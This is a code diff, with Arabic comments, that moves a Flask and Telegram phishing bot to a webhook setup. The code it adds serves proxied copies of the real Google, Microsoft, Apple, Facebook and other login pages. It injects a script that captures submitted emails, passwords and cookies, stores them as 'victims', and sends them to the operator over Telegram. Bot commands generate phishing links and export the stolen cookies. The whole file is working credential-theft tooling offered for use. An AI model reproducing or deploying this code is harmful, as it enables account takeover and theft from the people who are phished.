@@ -1,32 +1,27 @@
 #!/usr/bin/env python3
 # ============================================================
-# بوت تصيد متقدم (MITM) - سرقة الكوكيز من جميع المواقع
-# يعمل على Render / VPS / محلي
+# بوت تصيد متقدم - نسخة Webhook (تعمل على Render)
 # ============================================================
 
 import os
 import json
 import sqlite3
-import threading
 import secrets
 import requests
 from datetime import datetime
 from flask import Flask, request, jsonify, redirect, make_response
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, Bot
+from telegram.ext import Application, CommandHandler, ContextTypes, Dispatcher
 
 # ========== الإعدادات ==========
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
 ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "").split(",") if id.strip()]
-
-if not TELEGRAM_TOKEN:
-    raise ValueError("يرجى تعيين TELEGRAM_TOKEN في متغيرات البيئة")
-if not ADMIN_IDS:
-    raise ValueError("يرجى تعيين ADMIN_IDS في متغيرات البيئة")
-
 BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
 
-# ========== Flask App ==========
+if not TELEGRAM_TOKEN:
+    raise ValueError("TELEGRAM_TOKEN not set")
+
+# ========== Flask ==========
 app = Flask(__name__)
 
 # ========== قاعدة البيانات ==========
@@ -90,141 +85,15 @@ def mark_as_viewed(vid):
     conn.commit()
     conn.close()
 
-# ========== توليد روابط التصيد ==========
-def generate_session_id(target):
-    return f"{target}_{secrets.token_urlsafe(6)}"
-
-def generate_phish_link(target):
-    session_id = generate_session_id(target)
-    return f"{BASE_URL}/phish/{session_id}", session_id
-
-# ========== خادم التصيد ==========
-@app.route('/')
-def home():
-    return "🚀 Phishing Proxy Server is running!"
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-@app.route('/phish/<session_id>', methods=['GET', 'POST'])
-def phish_page(session_id):
-    target = session_id.split('_')[0] if '_' in session_id else 'google'
-    
-    targets = {
-        'google': 'https://accounts.google.com',
-        'facebook': 'https://www.facebook.com',
-        'microsoft': 'https://login.microsoftonline.com',
-        'apple': 'https://appleid.apple.com',
-        'github': 'https://github.com',
-        'twitter': 'https://twitter.com',
-        'instagram': 'https://www.instagram.com',
-        'linkedin': 'https://www.linkedin.com',
-        'amazon': 'https://www.amazon.com'
-    }
-    real_url = targets.get(target, 'https://accounts.google.com')
-    
-    if request.method == 'POST':
-        email = request.form.get('email') or request.form.get('username') or request.form.get('login') or ''
-        password = request.form.get('password') or request.form.get('pass') or ''
-        cookies = {k: v for k, v in request.cookies.items()}
-        ip = request.remote_addr
-        ua = request.headers.get('User-Agent', '')
-        save_victim(session_id, target, email, password, cookies, ip, ua)
-        
-        # إشعار للبوت
-        try:
-            import requests as req
-            msg = f"🔴 **اختراق جديد!**\n\n🎯 **الهدف:** `{target}`\n🆔 **الجلسة:** `{session_id}`\n📧 **البريد:** `{email}`\n🔑 **كلمة المرور:** `{password}`\n🕒 **الوقت:** {datetime.now().strftime('%H:%M:%S')}\n🍪 **الكوكيز:** {len(cookies)} كوكي"
-            req.post(f"http://localhost:5000/notify", json={"text": msg, "session_id": session_id})
-        except:
-            pass
-        
-        return redirect(real_url)
-    
-    # GET: عرض الموقع الأصلي
-    try:
-        response = requests.get(real_url, headers={'User-Agent': request.headers.get('User-Agent', '')})
-        html = response.text
-        
-        inject_script = f"""
-        <script>
-        (function() {{
-            let cookies = document.cookie.split(';').reduce((o, c) => {{
-                let [k, v] = c.trim().split('=');
-                o[k] = v;
-                return o;
-            }}, {{}});
-            cookies._session_id = '{session_id}';
-            
-            let originalSubmit = HTMLFormElement.prototype.submit;
-            HTMLFormElement.prototype.submit = function() {{
-                let form = this;
-                let formData = new FormData(form);
-                let data = {{}};
-                for (let [k, v] of formData) data[k] = v;
-                
-                fetch('/collect', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        session_id: '{session_id}',
-                        email: data.email || data.username || '',
-                        password: data.password || '',
-                        cookies: cookies
-                    }})
-                }});
-                originalSubmit.call(form);
-            }};
-        }})();
-        </script>
-        """
-        
-        html = html.replace('</body>', inject_script + '</body>')
-        return make_response(html)
-    except:
-        return redirect('https://accounts.google.com')
-
-@app.route('/collect', methods=['POST'])
-def collect():
-    data = request.json
-    session_id = data.get('session_id')
-    email = data.get('email', '')
-    password = data.get('password', '')
-    cookies = data.get('cookies', {})
-    
-    if session_id:
-        ip = request.remote_addr
-        ua = request.headers.get('User-Agent', '')
-        target = session_id.split('_')[0] if '_' in session_id else 'unknown'
-        save_victim(session_id, target, email, password, cookies, ip, ua)
-        try:
-            import requests as req
-            msg = f"🆕 **بيانات جديدة عبر JS!**\n🎯 الهدف: {target}\n📧 {email if email else 'غير موجود'}\n🍪 {len(cookies)} كوكي"
-            req.post(f"http://localhost:5000/notify", json={"text": msg, "session_id": session_id})
-        except:
-            pass
-    return jsonify({"status": "ok"}), 200
-
-@app.route('/notify', methods=['POST'])
-def notify():
-    data = request.json
-    text = data.get('text', '')
-    bot = Application.builder().token(TELEGRAM_TOKEN).build()
-    for admin_id in ADMIN_IDS:
-        bot.bot.send_message(chat_id=admin_id, text=text, parse_mode='Markdown')
-    return jsonify({"status": "ok"}), 200
-
-# ========== أوامر البوت ==========
+# ========== دوال البوت ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("⛔ غير مصرح لك.")
         return
     await update.message.reply_text(
-        "🔥 **بوت التصيد المتقدم v2.0**\n\n"
+        "🔥 **بوت التصيد المتقدم v3.0 (Webhook)**\n\n"
         "**الأوامر:**\n"
         "/phish <الهدف> - إنشاء رابط تصيد\n"
-        "   مثال: `/phish google`\n"
         "/list - عرض الضحايا\n"
         "/view <id> - عرض الكوكيز\n"
         "/export <id> - تصدير الكوكيز\n"
@@ -240,13 +109,13 @@ async def phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ استخدم: /phish <الهدف>\nمثال: `/phish google`")
         return
     target = context.args[0].lower()
-    link, session_id = generate_phish_link(target)
+    session_id = f"{target}_{secrets.token_urlsafe(6)}"
+    link = f"{BASE_URL}/phish/{session_id}"
     await update.message.reply_text(
         f"🔗 **رابط تصيد جديد**\n\n"
         f"🎯 **الهدف:** `{target}`\n"
         f"🆔 **الجلسة:** `{session_id}`\n"
-        f"🔗 **الرابط:** {link}\n\n"
-        f"📤 **شارك الرابط** مع الضحية.",
+        f"🔗 **الرابط:** {link}",
         parse_mode='Markdown'
     )
 
@@ -349,30 +218,161 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await start(update, context)
+# ========== مسار Webhook ==========
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    """استقبال التحديثات من تيليجرام"""
+    try:
+        data = request.get_json()
+        if not data:
+            return "No data", 400
+        
+        # إنشاء Update من البيانات
+        update = Update.de_json(data, bot)
+        
+        # معالجة التحديث باستخدام Dispatcher
+        dispatcher.process_update(update)
+        
+        return "OK", 200
+    except Exception as e:
+        print(f"Error: {e}")
+        return "Error", 500
 
-# ========== تشغيل الخادم والبوت معاً ==========
+@app.route('/set_webhook', methods=['GET'])
+def set_webhook():
+    """تعيين Webhook يدوياً"""
+    webhook_url = f"{BASE_URL}/webhook"
+    response = bot.set_webhook(url=webhook_url)
+    if response:
+        return f"✅ Webhook set to {webhook_url}"
+    return "❌ Failed to set webhook"
+
+@app.route('/')
+def home():
+    return "🚀 Phishing Proxy Server is running!"
+
+@app.route('/health')
+def health():
+    return "OK", 200
+
+# ========== خادم التصيد ==========
+@app.route('/phish/<session_id>', methods=['GET', 'POST'])
+def phish_page(session_id):
+    target = session_id.split('_')[0] if '_' in session_id else 'google'
+    
+    targets = {
+        'google': 'https://accounts.google.com',
+        'facebook': 'https://www.facebook.com',
+        'microsoft': 'https://login.microsoftonline.com',
+        'apple': 'https://appleid.apple.com',
+        'github': 'https://github.com',
+        'twitter': 'https://twitter.com',
+        'instagram': 'https://www.instagram.com',
+        'linkedin': 'https://www.linkedin.com',
+        'amazon': 'https://www.amazon.com'
+    }
+    real_url = targets.get(target, 'https://accounts.google.com')
+    
+    if request.method == 'POST':
+        email = request.form.get('email') or request.form.get('username') or request.form.get('login') or ''
+        password = request.form.get('password') or request.form.get('pass') or ''
+        cookies = {k: v for k, v in request.cookies.items()}
+        ip = request.remote_addr
+        ua = request.headers.get('User-Agent', '')
+        save_victim(session_id, target, email, password, cookies, ip, ua)
+        
+        # إشعار للبوت
+        try:
+            msg = f"🔴 **اختراق جديد!**\n\n🎯 **الهدف:** `{target}`\n📧 **البريد:** `{email}`\n🔑 **كلمة المرور:** `{password}`\n🍪 **الكوكيز:** {len(cookies)} كوكي"
+            for admin_id in ADMIN_IDS:
+                bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
+        except:
+            pass
+        
+        return redirect(real_url)
+    
+    # GET: عرض الموقع الأصلي
+    try:
+        response = requests.get(real_url, headers={'User-Agent': request.headers.get('User-Agent', '')})
+        html = response.text
+        
+        inject_script = f"""
+        <script>
+        (function() {{
+            let cookies = document.cookie.split(';').reduce((o, c) => {{
+                let [k, v] = c.trim().split('=');
+                o[k] = v;
+                return o;
+            }}, {{}});
+            
+            let originalSubmit = HTMLFormElement.prototype.submit;
+            HTMLFormElement.prototype.submit = function() {{
+                let form = this;
+                let formData = new FormData(form);
+                let data = {{}};
+                for (let [k, v] of formData) data[k] = v;
+                
+                fetch('/collect', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        session_id: '{session_id}',
+                        email: data.email || data.username || '',
+                        password: data.password || '',
+                        cookies: cookies
+                    }})
+                }});
+                originalSubmit.call(form);
+            }};
+        }})();
+        </script>
+        """
+        
+        html = html.replace('</body>', inject_script + '</body>')
+        return make_response(html)
+    except:
+        return redirect('https://accounts.google.com')
+
+@app.route('/collect', methods=['POST'])
+def collect():
+    data = request.json
+    session_id = data.get('session_id')
+    email = data.get('email', '')
+    password = data.get('password', '')
+    cookies = data.get('cookies', {})
+    
+    if session_id:
+        ip = request.remote_addr
+        ua = request.headers.get('User-Agent', '')
+        target = session_id.split('_')[0] if '_' in session_id else 'unknown'
+        save_victim(session_id, target, email, password, cookies, ip, ua)
+        
+        try:
+            msg = f"🆕 **بيانات جديدة عبر JS!**\n🎯 الهدف: {target}\n📧 {email if email else 'غير موجود'}\n🍪 {len(cookies)} كوكي"
+            for admin_id in ADMIN_IDS:
+                bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
+        except:
+            pass
+    
+    return jsonify({"status": "ok"}), 200
+
+# ========== تشغيل التطبيق ==========
 if __name__ == "__main__":
     init_db()
     
+    # إنشاء Bot و Dispatcher
+    bot = Bot(token=TELEGRAM_TOKEN)
+    dispatcher = Dispatcher(bot, None)
+    
+    # تسجيل الأوامر
+    dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("phish", phish))
+    dispatcher.add_handler(CommandHandler("list", list_victims))
+    dispatcher.add_handler(CommandHandler("view", view_victim))
+    dispatcher.add_handler(CommandHandler("export", export_victim))
+    dispatcher.add_handler(CommandHandler("delete", delete_victim))
+    dispatcher.add_handler(CommandHandler("stats", stats))
+    
     # تشغيل Flask
-    def run_flask():
-        port = int(os.environ.get("PORT", 5000))
-        app.run(host="0.0.0.0", port=port)
-    
-    threading.Thread(target=run_flask, daemon=True).start()
-    
-    # تشغيل البوت
-    application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_cmd))
-    application.add_handler(CommandHandler("phish", phish))
-    application.add_handler(CommandHandler("list", list_victims))
-    application.add_handler(CommandHandler("view", view_victim))
-    application.add_handler(CommandHandler("export", export_victim))
-    application.add_handler(CommandHandler("delete", delete_victim))
-    application.add_handler(CommandHandler("stats", stats))
-    
-    print("🚀 البوت يعمل...")
-    application.run_polling()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
